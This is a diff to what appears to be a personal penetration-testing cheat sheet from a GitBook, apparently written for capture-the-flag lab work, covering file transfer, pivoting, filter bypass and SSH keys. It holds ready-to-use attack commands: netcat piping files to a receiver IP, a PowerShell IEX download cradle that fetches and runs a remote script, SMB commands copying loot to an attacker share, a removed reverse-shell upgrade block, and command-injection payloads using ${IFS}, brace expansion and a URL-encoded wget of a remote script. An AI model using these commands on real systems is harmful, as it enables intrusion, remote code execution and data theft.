@@ -26,8 +26,8 @@ cat [file] | nc [receiver_IP] [receiver_port] - Alternative
 
 #### Powershell
 
-{% code fullWidth="true" %}
-```
+{% code fullWidth="false" %}
+```powershell
 powershell (New-Object System.Net.WebClient).DownloadFile('http://IP/file', 'file')
 download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE')
 Invoke-WebRequest http://domain.tld/script.ps1 -OutFile C:\Windows\Tasks\script.ps1
@@ -42,36 +42,20 @@ certutil -urlcache -f [path_to_file] [file_name]
 
 #### SMB
 
-```
-sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
-net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
-copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
-net use \\ATTACKER_IP\share /del
-```
+```bash
+#sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+#net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
+#copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+#net use \\ATTACKER_IP\share /del
 
-## Upgrading Reverse Shell&#x20;
-
-```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-Ctrl-Z
-# In Kali
-stty raw -echo
-stty size
-fg
-
-#In reverse shell
-reset
-export SHELL=bash
-export TERM=xterm-256color
-$stty rows <num> columns <cols>
-
-/usr/bin/script -qc /bin/bash /dev/null
-
-SOCAT
+sudo python3 /opt/impacket/examples/smbserver.py [share_name] pwd -smb2support 
+#Target
+net view \10.10.14.3\
+[CMD:] copy [LOOT] \[IP]\[share_name] 
+[PowerShell:] Copy-Item [LOOT] \[share]\[LOOT]
 ```
 
-## Password Cracking
+## Password Cracking/Spraying
 
 {% embed url="https://keydecryptor.com/" %}
 
@@ -101,15 +85,19 @@ cut -d "delimiter" -f (field number 1,2 etc.) file.txt
 ## Bypass Character Filters
 
 ```
-${IFS} - Internal Field Separator, default variable in bash
+${IFS} - Internal Field Separator, default variable in bash [Alternative to whitespace]
 
+#Curly brace expansion
 0xdf;{ping,-c,1,10.10.14.23};#
 0xdf;ping -c 1 10.10.14.23;#
 
-#Quotes was also not URL encoded
-password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
+\r\n -> EOL, similar function to ';'
+%0d : \r [Carriage return]
 %0a : \n
 %09 : \t
+
+#Quotes was also not URL encoded
+password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
 ```
 
 ## Pivoting & Port Forwarding
@@ -121,6 +109,8 @@ password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
 {% embed url="https://theyhack.me/Proxychains-Double-Pivoting/" %}
 
 {% embed url="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740" %}
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>eg. port 3306 running on target but no mysql client, access from kali unless sum like mysqldump is there</p></figcaption></figure>
 
 ## Git
 
@@ -134,7 +124,7 @@ git log
 git checkout [hash]
 ```
 
-### SSH Keys
+## SSH Keys
 
 Every revshell as an actual user -> this is the play
 
